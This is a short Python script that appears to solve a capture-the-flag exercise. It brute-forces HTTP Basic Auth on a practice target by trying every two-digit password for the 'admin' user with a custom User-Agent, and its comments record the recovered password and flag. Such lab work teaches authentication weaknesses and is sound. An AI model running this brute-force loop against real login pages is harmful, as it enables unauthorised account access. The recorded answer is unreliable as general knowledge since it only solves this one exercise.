

# Make a Python script that logs in to this page:
# http://target1.bowneconsulting.com/protected/A2.4
# with these parameters:
# Username: admin
# Password: a two-digit number
# User-Agent: python
# The server will reply with a flag.

import requests

# Input
url = 'http://target1.bowneconsulting.com/protected/A2.4'
username = 'admin'
headers = {'User-Agent': 'python'}

# Process, output
for password in range(99, -1, -1):
    pwd = str(password).rjust(2, '0')
    r = requests.get(url, auth=(username, pwd), headers=headers)
    if 'flag' in r.text:
        print(f"The '{username}' password is '{pwd}'")
        print(r.text)
        break

# The 'admin' password is '91'
#  The flag is basic-auth
